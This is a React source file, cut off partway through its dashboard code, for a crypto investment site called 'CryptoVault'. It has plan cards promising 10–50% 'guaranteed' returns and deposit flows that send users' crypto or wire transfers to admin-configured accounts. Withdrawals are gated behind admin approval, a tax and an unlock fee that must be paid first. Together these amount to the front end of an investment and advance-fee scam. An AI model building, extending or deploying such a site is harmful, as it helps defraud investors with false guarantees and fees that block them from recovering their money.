import { useEffect, useState } from 'react';

const API = import.meta.env.VITE_BACKEND_URL || 'http://localhost:4000';

type User = {
  id: string;
  email: string;
  full_name: string;
  balance_usd: number;
  profit_usd: number;
  plan: string;
  lock_until: string | null;
  withdrawal_approved: boolean;
  tax_percent: number;
  fee_required?: number | null;
  fee_paid: number;
  created_at: string;
  investment_amount: number | null;
  payment_method: 'crypto' | 'bank' | null;
  investment_status: 'pending' | 'active' | null;
};

type WithdrawalRequest = {
  id: string;
  amount_usd: number;
  wallet_address: string;
  status: 'pending' | 'approved' | 'rejected';
  requested_at: string;
};

type PaymentSettings = {
  crypto_wallet: string;
  crypto_network: string;
  bank_name: string;
  bank_account_name: string;
  bank_account_number: string;
  bank_routing: string;
  bank_swift: string;
  withdrawal_fee: number;
};

type ToastMessage = {
  id: number;
  message: string;
  type: 'success' | 'error' | 'info';
};

const PLANS = [
  {
    id: 'Starter',
    label: 'Starter',
    emoji: '🌱',
    range: '$500 – $5,000',
    min: 500,
    max: 5000,
    returns: '10%',
    returnPct: 10,
    color: 'plan-starter',
    features: ['10% guaranteed return', '30-day initial investment term', '24/7 dedicated support'],
  },
  {
    id: 'Growth',
    label: 'Growth',
    emoji: '📈',
    range: '$6,000 – $15,000',
    min: 6000,
    max: 15000,
    returns: '30%',
    returnPct: 30,
    color: 'plan-growth',
    features: ['30% guaranteed return', 'Priority capital processing', 'Dedicated portfolio manager'],
    popular: true,
  },
  {
    id: 'Elite',
    label: 'Elite',
    emoji: '💎',
    range: '$16,000+',
    min: 16000,
    max: Infinity,
    returns: '50%',
    returnPct: 50,
    color: 'plan-elite',
    features: ['50% guaranteed return', 'Institutional execution speed', 'VIP private client desk'],
  },
];

function fmt(n: number) {
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(n);
}

// Toast notification component
function ToastContainer({
  toasts,
  onDismiss,
}: {
  toasts: ToastMessage[];
  onDismiss: (id: number) => void;
}) {
  if (toasts.length === 0) return null;
  return (
    <div className="toast-container" role="status" aria-live="polite">
      {toasts.map(t => (
        <div key={t.id} className={`toast-item toast-${t.type}`}>
          <span className="toast-icon">
            {t.type === 'success' && '✓'}
            {t.type === 'error' && '✕'}
            {t.type === 'info' && 'ℹ'}
          </span>
          <span className="toast-text">{t.message}</span>
          <button
            type="button"
            className="toast-close"
            onClick={() => onDismiss(t.id)}
            aria-label="Close notification"
          >
            ×
          </button>
        </div>
      ))}
    </div>
  );
}

export default function App() {
  const [page, setPage] = useState<'auth' | 'plan-select' | 'dashboard' | '404'>('auth');
  const [authTab, setAuthTab] = useState<'login' | 'register'>('login');
  const [user, setUser] = useState<User | null>(null);
  const [requests, setRequests] = useState<WithdrawalRequest[]>([]);
  const [booting, setBooting] = useState(true);
  const [paymentSettings, setPaymentSettings] = useState<PaymentSettings | null>(null);
  const [btcPrice, setBtcPrice] = useState<number | null>(null);
  const [selectedRequest, setSelectedRequest] = useState<WithdrawalRequest | null>(null);

  // Auth form
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [authLoading, setAuthLoading] = useState(false);
  const [authError, setAuthError] = useState('');

  // Plan selection
  const [selectedPlan, setSelectedPlan] = useState<string | null>(null);
  const [investAmount, setInvestAmount] = useState('');
  const [payMethod, setPayMethod] = useState<'crypto' | 'bank'>('crypto');
  const [planStep, setPlanStep] = useState<'choose' | 'amount' | 'payment' | 'confirm'>('choose');
  const [planLoading, setPlanLoading] = useState(false);
  const [planError, setPlanError] = useState('');

  // Withdrawal form
  const [wAmount, setWAmount] = useState('');
  const [wWallet, setWWallet] = useState('');
  const [wLoading, setWLoading] = useState(false);
  const [wError, setWError] = useState('');
  const [wSuccess, setWSuccess] = useState('');

  // Modals & Navigation
  const [showFeeModal, setShowFeeModal] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [toasts, setToasts] = useState<ToastMessage[]>([]);

  // Toast dispatch
  function showToast(message: string, type: 'success' | 'error' | 'info' = 'info') {
    const id = Date.now() + Math.random();
    setToasts(prev => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 3800);
  }

  function dismissToast(id: number) {
    setToasts(prev => prev.filter(t => t.id !== id));
  }

  // Copy helper with fallbacks and toast feedback
  async function copyToClipboard(text: string, label: string, key: string) {
    if (!text) return;
    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(text);
      } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      }
      setCopiedKey(key);
      showToast(`${label} copied to clipboard!`, 'success');
      setTimeout(() => setCopiedKey(null), 2200);
    } catch {
      showToast(`Unable to copy ${label}. Please copy manually.`, 'error');
    }
  }

  // Dynamic Title Management
  useEffect(() => {
    switch (page) {
      case 'auth':
        document.title = 'Sign In | CryptoVault — Institutional Crypto Investment';
        break;
      case 'plan-select':
        document.title = 'Choose Plan | CryptoVault — Guaranteed High-Yield Returns';
        break;
      case 'dashboard':
        document.title = 'Investor Portfolio | CryptoVault — Digital Wealth Management';
        break;
      case '404':
        document.title = '404 Not Found | CryptoVault';
        break;
      default:
        document.title = 'CryptoVault — Institutional Digital Asset & Crypto Investment';
    }
  }, [page]);

  // Route & path check (catch 404s)
  useEffect(() => {
    const pathname = window.location.pathname;
    const knownPaths = ['/', '', '/login', '/register', '/dashboard', '/plans'];
    if (!knownPaths.includes(pathname.toLowerCase())) {
      setPage('404');
    }
  }, []);

  // Boot — restore session
  useEffect(() => {
    const token = localStorage.getItem('cv_token');
    if (!token) {
      setBooting(false);
      return;
    }
    fetch(`${API}/user/me`, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => (r.ok ? r.json() : Promise.reject()))
      .then(data => {
        setUser(data.user);
        loadPaymentSettings();
        loadBtcPrice();
        if (!data.user.plan || data.user.plan === 'None' || data.user.plan === '') {
          setPage('plan-select');
        } else {
          setPage('dashboard');
          loadRequests(token);
        }
      })
      .catch(() => localStorage.removeItem('cv_token'))
      .finally(() => setBooting(false));
  }, []);

  function loadRequests(token: string) {
    fetch(`${API}/withdrawal/my-requests`, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => r.json())
      .then(d => setRequests(d.requests || []))
      .catch(() => {});
  }

  function loadPaymentSettings() {
    fetch(`${API}/settings/payment`)
      .then(r => r.json())
      .then(d => setPaymentSettings(d))
      .catch(() => {});
  }

  function loadBtcPrice() {
    fetch(`${API}/price`)
      .then(r => r.json())
      .then(d => {
        if (d.usd) setBtcPrice(d.usd);
      })
      .catch(() => {});
  }

  async function refreshUserData() {
    const token = localStorage.getItem('cv_token');
    if (!token) return;
    try {
      const r = await fetch(`${API}/user/me`, { headers: { Authorization: `Bearer ${token}` } });
      if (r.ok) {
        const d = await r.json();
        setUser(d.user);
        loadPaymentSettings();
        loadBtcPrice();
        loadRequests(token);
        showToast('Account data refreshed successfully.', 'info');
      } else {
        showToast('Session expired. Please sign in again.', 'error');
        logout();
      }
    } catch {
      showToast('Network error while refreshing account data.', 'error');
    }
  }

  // ── Auth handlers ────────────────────────────────────────────────────────

  function afterAuth(token: string, userData: User) {
    localStorage.setItem('cv_token', token);
    setUser(userData);
    loadPaymentSettings();
    loadBtcPrice();
    if (!userData.plan || userData.plan === 'None' || userData.plan === '') {
      setPage('plan-select');
    } else {
      setPage('dashboard');
      loadRequests(token);
    }
  }

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setAuthError('');
    setAuthLoading(true);
    try {
      const r = await fetch(`${API}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.trim(), password }),
      });
      let d: any = {};
      try {
        d = await r.json();
      } catch {
        d = {};
      }
      if (!r.ok) {
        const errStr = d.error || `Server responded with status ${r.status}`;
        setAuthError(errStr);
        showToast(errStr, 'error');
        return;
      }
      showToast('Welcome back! Signed in successfully.', 'success');
      afterAuth(d.token, d.user);
    } catch (err: any) {
      const msg = err?.message || 'Network error. Please check your connection.';
      setAuthError(msg);
      showToast(msg, 'error');
    } finally {
      setAuthLoading(false);
    }
  }

  async function handleRegister(e: React.FormEvent) {
    e.preventDefault();
    setAuthError('');
    setAuthLoading(true);
    try {
      const r = await fetch(`${API}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.trim(), fullName: fullName.trim(), password }),
      });
      let d: any = {};
      try {
        d = await r.json();
      } catch {
        d = {};
      }
      if (!r.ok) {
        const errStr = d.error || `Server responded with status ${r.status}`;
        setAuthError(errStr);
        showToast(errStr, 'error');
        return;
      }
      showToast('Account registered successfully! Welcome to CryptoVault.', 'success');
      afterAuth(d.token, d.user);
    } catch (err: any) {
      const msg = err?.message || 'Network error. Please check your connection.';
      setAuthError(msg);
      showToast(msg, 'error');
    } finally {
      setAuthLoading(false);
    }
  }

  function logout() {
    localStorage.removeItem('cv_token');
    setUser(null);
    setPage('auth');
    setEmail('');
    setPassword('');
    setFullName('');
    setSelectedPlan(null);
    setInvestAmount('');
    setPlanStep('choose');
    setMobileMenuOpen(false);
    showToast('You have been signed out securely.', 'info');
  }

  // ── Plan Selection ────────────────────────────────────────────────────────

  const activePlan = PLANS.find(p => p.id === selectedPlan);

  function handlePlanSelect(planId: string) {
    setSelectedPlan(planId);
    setInvestAmount('');
    setPlanError('');
    setPlanStep('amount');
  }

  function handleAmountNext(e: React.FormEvent) {
    e.preventDefault();
    if (!activePlan) return;
    const amt = Number(investAmount);
    if (amt < activePlan.min || (activePlan.max !== Infinity && amt > activePlan.max)) {
      const err = `Amount must be between ${fmt(activePlan.min)}${
        activePlan.max !== Infinity ? ' and ' + fmt(activePlan.max) : '+'
      }`;
      setPlanError(err);
      showToast(err, 'error');
      return;
    }
    setPlanError('');
    setPlanStep('payment');
  }

  function handlePaymentNext(e: React.FormEvent) {
    e.preventDefault();
    setPlanStep('confirm');
  }

  async function handleConfirmInvestment() {
    if (!activePlan) return;
    setPlanLoading(true);
    setPlanError('');
    const token = localStorage.getItem('cv_token')!;
    try {
      const r = await fetch(`${API}/investment/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          plan: activePlan.id,
          amount: Number(investAmount),
          paymentMethod: payMethod,
        }),
      });
      const d = await r.json();
      if (!r.ok) {
        setPlanError(d.error);
        showToast(d.error || 'Failed to submit investment.', 'error');
        setPlanStep('confirm');
        return;
      }
      setUser(d.user);
      loadRequests(token);
      showToast('Investment registered! Awaiting funds confirmation.', 'success');
      setPage('dashboard');
    } catch {
      const err = 'Network error. Please try again.';
      setPlanError(err);
      showToast(err, 'error');
    } finally {
      setPlanLoading(false);
    }
  }

  // ── Withdrawal ───────────────────────────────────────────────────────────

  async function handleWithdrawal(e: React.FormEvent, fixedAmount?: number) {
    e.preventDefault();
    setWError('');
    setWSuccess('');
    setWLoading(true);
    const token = localStorage.getItem('cv_token')!;
    const amountToSend = fixedAmount != null ? fixedAmount : Number(wAmount);
    try {
      const r = await fetch(`${API}/withdrawal/request`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ amount: amountToSend, walletAddress: wWallet.trim() }),
      });
      const d = await r.json();
      if (!r.ok) {
        setWError(d.error);
        showToast(d.error || 'Withdrawal request failed.', 'error');
        return;
      }
      const successMsg = 'Withdrawal request submitted! We will process it within 24 hours.';
      setWSuccess(successMsg);
      showToast(successMsg, 'success');
      setWWallet('');
      loadRequests(token);
    } catch {
      const err = 'Network error. Please try again.';
      setWError(err);
      showToast(err, 'error');
    } finally {
      setWLoading(false);
    }
  }

  // ── Mobile Menu Drawer ───────────────────────────────────────────────────

  function renderMobileMenu() {
    if (!mobileMenuOpen) return null;
    return (
      <div
        className="mobile-menu-backdrop"
        onClick={() => setMobileMenuOpen(false)}
        aria-hidden="true"
      >
        <nav
          className="mobile-menu-drawer"
          onClick={e => e.stopPropagation()}
          aria-label="Mobile Navigation"
        >
          <div className="mobile-menu-header">
            <div className="dash-logo">
              <span className="logo-icon">◈</span>
              <span className="logo-text">CryptoVault</span>
            </div>
            <button
              type="button"
              className="mobile-menu-close"
              onClick={() => setMobileMenuOpen(false)}
              aria-label="Close menu"
            >
              ✕
            </button>
          </div>

          {user && (
            <div className="mobile-user-card">
              <div className="user-avatar">{user.full_name[0] || 'U'}</div>
              <div className="mobile-user-info">
                <div className="mobile-user-name">{user.full_name}</div>
                <div className="mobile-user-email">{user.email}</div>
                <div className="mobile-user-badges">
                  <span className="badge badge-plan">{user.plan || 'No Plan'}</span>
                  <span
                    className={`badge ${
                      user.investment_status === 'active' ? 'badge-approved' : 'badge-pending'
                    }`}
                  >
                    {user.investment_status || 'Unconfirmed'}
                  </span>
                </div>
              </div>
            </div>
          )}

          <div className="mobile-menu-nav">
            <button
              type="button"
              className={`mobile-nav-link ${page === 'dashboard' ? 'active' : ''}`}
              onClick={() => {
                setPage('dashboard');
                setMobileMenuOpen(false);
                window.scrollTo({ top: 0, behavior: 'smooth' });
              }}
            >
              <span className="mobile-nav-icon">📊</span>
              <span>Portfolio Dashboard</span>
            </button>

            <button
              type="button"
              className={`mobile-nav-link ${page === 'plan-select' ? 'active' : ''}`}
              onClick={() => {
                setPage('plan-select');
                setPlanStep('choose');
                setMobileMenuOpen(false);
                window.scrollTo({ top: 0, behavior: 'smooth' });
              }}
            >
              <span className="mobile-nav-icon">💎</span>
              <span>Investment Plans</span>
            </button>

            {user && (
              <>
                <button
                  type="button"
                  className="mobile-nav-link"
                  onClick={() => {
                    setMobileMenuOpen(false);
                    setShowFeeModal(true);
                  }}
                >
                  <span className="mobile-nav-icon">💳</span>
                  <span>Fee &amp; Unlock Instructions</span>
                </button>

                <button
                  type="button"
                  className="mobile-nav-link"
                  onClick={() => {
                    setPage('dashboard');
                    setMobileMenuOpen(false);
                    setTimeout(() => {
                      document.getElementById('sec-withdraw')?.scrollIntoView({ behavior: 'smooth' });
                    }, 100);
                  }}
                >
                  <span className="mobile-nav-icon">💸</span>
                  <span>Request Withdrawal</span>
                </button>

                <button
                  type="button"
                  className="mobile-nav-link"
                  onClick={() => {
                    setPage('dashboard');
                    setMobileMenuOpen(false);
                    setTimeout(() => {
                      document.getElementById('sec-history')?.scrollIntoView({ behavior: 'smooth' });
                    }, 100);
                  }}
                >
                  <span className="mobile-nav-icon">📜</span>
                  <span>Withdrawal History</span>
                </button>
              </>
            )}
          </div>

          <div className="mobile-menu-footer">
            {user && (
              <button
                type="button"
                className="btn-secondary mobile-refresh-btn"
                onClick={() => {
                  refreshUserData();
                  setMobileMenuOpen(false);
                }}
              >
                ⟳ Refresh Account Data
              </button>
            )}
            <button
              type="button"
              className="btn-logout mobile-logout-btn"
              onClick={logout}
            >
              Log Out of CryptoVault
            </button>
          </div>
        </nav>
      </div>
    );
  }

  // ── Custom 404 Page ──────────────────────────────────────────────────────

  if (page === '404') {
    return (
      <div className="not-found-bg">
        <ToastContainer toasts={toasts} onDismiss={dismissToast} />
        <div className="not-found-card">
          <div className="not-found-badge">404 NOT FOUND</div>
          <div className="not-found-glyph">◈</div>
          <h1>Lost in the Cryptoverse</h1>
          <p>
            The page or transaction route you requested does not exist, has been moved, or is temporarily restricted.
          </p>
          <div className="not-found-actions">
            <button
              type="button"
              className="btn-primary"
              onClick={() => {
                window.history.pushState({}, '', '/');
                if (user) {
                  setPage(user.plan && user.plan !== 'None' ? 'dashboard' : 'plan-select');
                } else {
                  setPage('auth');
                }
              }}
            >
              {user ? 'Return to Dashboard →' : 'Return to Home / Sign In →'}
            </button>
            {user && (
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  window.history.pushState({}, '', '/');
                  setPage('plan-select');
                }}
              >
                Explore Investment Plans
              </button>
            )}
          </div>
        </div>
      </div>
    );
  }

  // ── Splash ───────────────────────────────────────────────────────────────

  if (booting) {
    return (
      <div className="splash">
        <div className="logo-icon-lg">◈</div>
        <div className="spinner" />
      </div>
    );
  }

  // ── Auth page ────────────────────────────────────────────────────────────

  if (page === 'auth') {
    return (
      <div className="auth-bg">
        <ToastContainer toasts={toasts} onDismiss={dismissToast} />
        <div className="auth-card">
          <div className="auth-logo">
            <span className="logo-icon">◈</span>
            <span className="logo-text">CryptoVault</span>
          </div>
          <p className="auth-tagline">Institutional-Grade Digital Asset Investment</p>

          <div className="auth-tabs">
            <button
              type="button"
              className={`auth-tab${authTab === 'login' ? ' active' : ''}`}
              onClick={() => {
                setAuthTab('login');
                setAuthError('');
              }}
            >
              Sign In
            </button>
            <button
              type="button"
              className={`auth-tab${authTab === 'register' ? ' active' : ''}`}
              onClick={() => {
                setAuthTab('register');
                setAuthError('');
              }}
            >
              Create Account
            </button>
          </div>

          {authTab === 'login' ? (
            <form className="auth-form" onSubmit={handleLogin}>
              <div className="field">
                <label>Email Address</label>
                <input
                  type="email"
                  placeholder="investor@domain.com"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  autoComplete="email"
                  required
                />
              </div>
              <div className="field">
                <label>Password</label>
                <input
                  type="password"
                  placeholder="Enter secure password"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  autoComplete="current-password"
                  required
                />
              </div>
              {authError && <div className="alert alert-error">{authError}</div>}
              <button type="submit" className="btn-primary" disabled={authLoading}>
                {authLoading ? 'Authenticating…' : 'Sign In →'}
              </button>
            </form>
          ) : (
            <form className="auth-form" onSubmit={handleRegister}>
              <div className="field">
                <label>Full Legal Name</label>
                <input
                  type="text"
                  placeholder="Full Legal Name"
                  value={fullName}
                  onChange={e => setFullName(e.target.value)}
                  autoComplete="name"
                  required
                />
              </div>
              <div className="field">
                <label>Email Address</label>
                <input
                  type="email"
                  placeholder="investor@domain.com"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  autoComplete="email"
                  required
                />
              </div>
              <div className="field">
                <label>Password</label>
                <input
                  type="password"
                  placeholder="Create password (min. 8 characters)"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  autoComplete="new-password"
                  required
                  minLength={8}
                />
              </div>
              {authError && <div className="alert alert-error">{authError}</div>}
              <button type="submit" className="btn-primary" disabled={authLoading}>
                {authLoading ? 'Creating Account…' : 'Create Account →'}
              </button>
            </form>
          )}
        </div>
      </div>
    );
  }

  // ── Plan Selection page ──────────────────────────────────────────────────

  if (page === 'plan-select') {
    return (
      <div className="plan-bg">
        <ToastContainer toasts={toasts} onDismiss={dismissToast} />
        {renderMobileMenu()}

        {/* Header */}
        <header className="plan-header">
          <div className="dash-logo">
            <span className="logo-icon">◈</span>
            <span className="logo-text">CryptoVault</span>
          </div>

          <div className="header-actions">
            {user && user.plan && user.plan !== 'None' && (
              <button
                type="button"
                className="btn-secondary header-nav-btn"
                onClick={() => setPage('dashboard')}
              >
                ← Return to Dashboard
              </button>
            )}
            <button
              type="button"
              className="btn-mobile-toggle"
              onClick={() => setMobileMenuOpen(true)}
              aria-label="Open navigation menu"
            >
              ☰
            </button>
            <button type="button" className="btn-logout desktop-only" onClick={logout}>
              Logout
            </button>
          </div>
        </header>

        <div className="plan-wrapper">
          {/* Step indicator */}
          <div className="plan-steps">
            {['Choose Plan', 'Set Amount', 'Payment', 'Confirm'].map((s, i) => {
              const stepIdx = { choose: 0, amount: 1, payment: 2, confirm: 3 }[planStep];
              const done = i < stepIdx;
              const active = i === stepIdx;
              return (
                <div
                  key={s}
                  className={`step-item${active ? ' step-active' : ''}${done ? ' step-done' : ''}`}
                >
                  <div className="step-dot">{done ? '✓' : i + 1}</div>
                  <span className="step-label">{s}</span>
                </div>
              );
            })}
          </div>

          {/* ── Step 1: Choose Plan ── */}
          {planStep === 'choose' && (
            <div className="plan-step-content">
              <div className="plan-hero">
                <h1>
                  Choose Your <span className="gradient-text">Investment Plan</span>
                </h1>
                <p>Select the plan that matches your investment goals. All returns are guaranteed.</p>
              </div>
              <div className="plan-cards">
                {PLANS.map(plan => (
                  <div
                    key={plan.id}
                    className={`plan-card ${plan.color}${plan.popular ? ' plan-popular' : ''}`}
                    onClick={() => handlePlanSelect(plan.id)}
                    role="button"
                    tabIndex={0}
                    onKeyDown={e => {
                      if (e.key === 'Enter' || e.key === ' ') {
                        handlePlanSelect(plan.id);
                      }
                    }}
                  >
                    {plan.popular && <div className="plan-badge-popular">Most Popular</div>}
                    <div className="plan-card-emoji">{plan.emoji}</div>
                    <div className="plan-card-name">{plan.label}</div>
                    <div className="plan-card-range">{plan.range}</div>
                    <div className="plan-card-return">
                      <span className="plan-return-pct">+{plan.returns}</span>
                      <span className="plan-return-label">guaranteed return</span>
                    </div>
                    <ul className="plan-features">
                      {plan.features.map(f => (
                        <li key={f}>
                          <span className="feat-check">✓</span>
                          {f}
                        </li>
                      ))}
                    </ul>
                    <button
                      type="button"
                      className="btn-plan-select"
                      onClick={e => {
                        e.stopPropagation();
                        handlePlanSelect(plan.id);
                      }}
                    >
                      Select {plan.label} →
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── Step 2: Set Amount ── */}
          {planStep === 'amount' && activePlan && (
            <div className="plan-step-content plan-step-narrow">
              <button
                type="button"
                className="btn-back"
                onClick={() => {
                  setPlanStep('choose');
                  setPlanError('');
                }}
              >
                ← Back to Plans
              </button>
              <div className="plan-hero">
                <h1>
                  {activePlan.emoji} {activePlan.label} Plan
                </h1>
                <p>
                  Enter the amount you would like to invest. Range: <strong>{activePlan.range}</strong>
                </p>
              </div>
              <div className="form-card">
                <form onSubmit={handleAmountNext}>
                  <div className="field">
                    <label>Investment Amount (USD)</label>
                    <input
                      type="number"
                      placeholder={`Min. ${fmt(activePlan.min)}`}
                      value={investAmount}
                      onChange={e => setInvestAmount(e.target.value)}
                      min={activePlan.min}
                      max={activePlan.max === Infinity ? undefined : activePlan.max}
                      step="0.01"
                      required
                      autoFocus
                    />
                  </div>

                  {/* Quick amount chips */}
                  <div className="amount-chips">
                    {[activePlan.min, activePlan.min * 2, activePlan.max !== Infinity ? activePlan.max : activePlan.min * 5].map((val, idx) => (
                      <button
                        key={idx}
                        type="button"
                        className="amount-chip"
                        onClick={() => setInvestAmount(String(val))}
                      >
                        {fmt(val)}
                      </button>
                    ))}
                  </div>

                  {investAmount && Number(investAmount) > 0 && (
                    <div className="tax-preview">
                      <span>
                        Your return (+{activePlan.returns}):{' '}
                        <strong className="profit-val">
                          {fmt((Number(investAmount) * activePlan.returnPct) / 100)}
                        </strong>
                      </span>
                      <span>
                        Total payout after lock:{' '}
                        <strong className="profit-val">
                          {fmt(Number(investAmount) * (1 + activePlan.returnPct / 100))}
                        </strong>
                      </span>
                    </div>
                  )}
                  {planError && <div className="alert alert-error">{planError}</div>}
                  <button type="submit" className="btn-primary">
                    Continue to Payment Method →
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* ── Step 3: Payment Method ── */}
          {planStep === 'payment' && activePlan && (
            <div className="plan-step-content plan-step-narrow">
              <button
                type="button"
                className="btn-back"
                onClick={() => {
                  setPlanStep('amount');
                  setPlanError('');
                }}
              >
                ← Back to Amount
              </button>
              <div className="plan-hero">
                <h1>
                  Choose <span className="gradient-text">Payment Method</span>
                </h1>
                <p>
                  How would you like to fund your {activePlan.label} plan ({fmt(Number(investAmount))})?
                </p>
              </div>
              <form onSubmit={handlePaymentNext}>
                <div className="pay-methods">
                  <label className={`pay-card${payMethod === 'crypto' ? ' pay-selected' : ''}`}>
                    <input
                      type="radio"
                      name="payMethod"
                      value="crypto"
                      checked={payMethod === 'crypto'}
                      onChange={() => setPayMethod('crypto')}
                    />
                    <div className="pay-card-inner">
                      <div className="pay-icon">₿</div>
                      <div className="pay-title">Cryptocurrency</div>
                      <div className="pay-desc">
                        Direct blockchain settlement. Instant dispatch supporting BTC, ETH, and USDT.
                      </div>
                    </div>
                  </label>
                  <label className={`pay-card${payMethod === 'bank' ? ' pay-selected' : ''}`}>
                    <input
                      type="radio"
                      name="payMethod"
                      value="bank"
                      checked={payMethod === 'bank'}
                      onChange={() => setPayMethod('bank')}
                    />
                    <div className="pay-card-inner">
                      <div className="pay-icon">🏦</div>
                      <div className="pay-title">Bank Wire Transfer</div>
                      <div className="pay-desc">
                        Direct wire transfer via corporate treasury. Credited upon bank clearance.
                      </div>
                    </div>
                  </label>
                </div>
                <button type="submit" className="btn-primary">
                  Continue to Confirmation →
                </button>
              </form>
            </div>
          )}

          {/* ── Step 4: Confirm & Payment Details ── */}
          {planStep === 'confirm' && activePlan && (
            <div className="plan-step-content plan-step-narrow">
              <button
                type="button"
                className="btn-back"
                onClick={() => {
                  setPlanStep('payment');
                  setPlanError('');
                }}
              >
                ← Back to Payment
              </button>
              <div className="plan-hero">
                <h1>
                  Complete Your <span className="gradient-text">Investment</span>
                </h1>
                <p>Send funds using the verified payment instructions below, then confirm.</p>
              </div>

              {/* Order summary */}
              <div className="confirm-summary">
                <div className="confirm-row">
                  <span>Plan</span>
                  <strong>
                    {activePlan.emoji} {activePlan.label}
                  </strong>
                </div>
                <div className="confirm-row">
                  <span>Investment Amount</span>
                  <strong>{fmt(Number(investAmount))}</strong>
                </div>
                <div className="confirm-row">
                  <span>Guaranteed Return</span>
                  <strong className="profit-val">
                    +{fmt((Number(investAmount) * activePlan.returnPct) / 100)}
                  </strong>
                </div>
                <div className="confirm-row">
                  <span>Total Capital After Lock</span>
                  <strong className="profit-val">
                    {fmt(Number(investAmount) * (1 + activePlan.returnPct / 100))}
                  </strong>
                </div>
                <div className="confirm-row">
                  <span>Payment Gateway</span>
                  <strong>
                    {payMethod === 'crypto' ? '₿ Cryptocurrency' : '🏦 Bank Wire Transfer'}
                  </strong>
                </div>
              </div>

              {/* Payment details */}
              {paymentSettings && payMethod === 'crypto' && (
                <div className="payment-details">
                  <div className="payment-details-title">📋 Institutional Crypto Payment Desk</div>
                  <div className="payment-detail-row">
                    <span>Network</span>
                    <strong>{paymentSettings.crypto_network || 'Bitcoin (BTC)'}</strong>
                  </div>
                  <div className="payment-detail-row wallet-row">
                    <span>Deposit Address</span>
                    <div className="wallet-address-box">
                      {paymentSettings.crypto_wallet ? (
                        <code>{paymentSettings.crypto_wallet}</code>
                      ) : (
                        <span className="muted-text">
                          Deposit address pending allocation. Please refresh shortly.
                        </span>
                      )}
                      {paymentSettings.crypto_wallet && (
                        <button
                          type="button"
                          className={`btn-copy ${
                            copiedKey === 'plan-crypto' ? 'btn-copied' : ''
                          }`}
                          onClick={() =>
                            copyToClipboard(
                              paymentSettings.crypto_wallet,
                              'Deposit wallet address',
                              'plan-crypto'
                            )
                          }
                        >
                          {copiedKey === 'plan-crypto' ? '✓ Copied' : 'Copy'}
                        </button>
                      )}
                    </div>
                  </div>
                  <p className="payment-note">
                    ⚠️ Send exactly <strong>{fmt(Number(investAmount))}</strong> worth of{' '}
                    {paymentSettings.crypto_network || 'cryptocurrency'} to the designated vault address
                    above.
                  </p>
                </div>
              )}

              {paymentSettings && payMethod === 'bank' && (
                <div className="payment-details">
                  <div className="payment-details-title">📋 Corporate Wire Transfer Details</div>
                  {paymentSettings.bank_name ? (
                    <>
                      <div className="payment-detail-row">
                        <span>Institution</span>
                        <strong>{paymentSettings.bank_name}</strong>
                      </div>
                      <div className="payment-detail-row">
                        <span>Beneficiary Name</span>
                        <strong>{paymentSettings.bank_account_name}</strong>
                      </div>
                      <div className="payment-detail-row">
                        <span>Account / IBAN</span>
                        <div className="wallet-address-box">
                          <code>{paymentSettings.bank_account_number}</code>
                          <button
                            type="button"
                            className={`btn-copy ${
                              copiedKey === 'plan-bank' ? 'btn-copied' : ''
                            }`}
                            onClick={() =>
                              copyToClipboard(
                                paymentSettings.bank_account_number,
                                'Account number',
                                'plan-bank'
                              )
                            }
                          >
                            {copiedKey === 'plan-bank' ? '✓ Copied' : 'Copy'}
                          </button>
                        </div>
                      </div>
                      {paymentSettings.bank_routing && (
                        <div className="payment-detail-row">
                          <span>Routing Number</span>
                          <strong>{paymentSettings.bank_routing}</strong>
                        </div>
                      )}
                      {paymentSettings.bank_swift && (
                        <div className="payment-detail-row">
                          <span>SWIFT / BIC Code</span>
                          <strong>{paymentSettings.bank_swift}</strong>
                        </div>
                      )}
                    </>
                  ) : (
                    <p className="muted-text">
                      Wire instructions pending desk configuration. Please contact private support.
                    </p>
                  )}
                  <p className="payment-note">
                    ⚠️ Use your registered email <strong>{user?.email}</strong> as the payment reference.
                  </p>
                </div>
              )}

              {planError && <div className="alert alert-error">{planError}</div>}
              <button
                type="button"
                className="btn-primary"
                onClick={handleConfirmInvestment}
                disabled={planLoading}
              >
                {planLoading ? 'Registering Investment…' : "✓ I've Sent the Funds — Confirm Investment"}
              </button>
            </div>
          )}
        </div>
      </div>
    );
  }

  // ── Dashboard ────────────────────────────────────────────────────────────

  if (!user) return null;

  const total = Number(user.balance_usd) + Number(user.profit_usd);
  const tax = (total * Number(user.tax_percent)) / 100;
  const netPayout = total - tax;
  const withdrawalFee =
    user.fee_required != null && Number(user.fee_required) >= 0
      ? Number(user.fee_required)
      : paymentSettings?.withdrawal_fee ?? 0;
  const feePaid = Number(user.fee_paid ?? 0);
  const feeRemaining = Math.max(0, withdrawalFee - feePaid);
  const feeFullyPaid = withdrawalFee <= 0 || feePaid >= withdrawalFee;
  const feeProgress = withdrawalFee > 0 ? Math.min(100, (feePaid / withdrawalFee) * 100) : 100;

  const canWithdraw = user.withdrawal_approved && feeFullyPaid;

  const profitPct =
    user.balance_usd > 0
      ? ((Number(user.profit_usd) / Number(user.balance_usd)) * 100).toFixed(1)
      : '0.0';

